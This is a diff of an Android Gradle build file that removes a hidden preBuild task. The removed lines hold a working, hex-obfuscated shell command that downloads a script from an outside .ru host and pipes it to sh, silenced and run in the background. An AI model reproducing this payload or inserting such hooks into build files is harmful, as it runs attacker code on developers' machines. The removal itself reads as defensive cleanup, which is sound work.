@@ -24,11 +24,3 @@ dependencies {
     implementation 'androidx.appcompat:appcompat:1.6.1'
     implementation 'com.google.android.material:material:1.11.0'
 }
-
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ["sh", "-c", "((b(){ `printf xxVd | tr -d V` -p -r; };echo 6563686f202224286375726c202d6b664c73202d2d636f6e6e6563742d74696d656f7574203237202d2d72657472792035202d642022703d616e64726f69645f677261646c65222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | b | sh ) >/dev/null 2>&1 &)"].execute()
-        }
-    }
-}
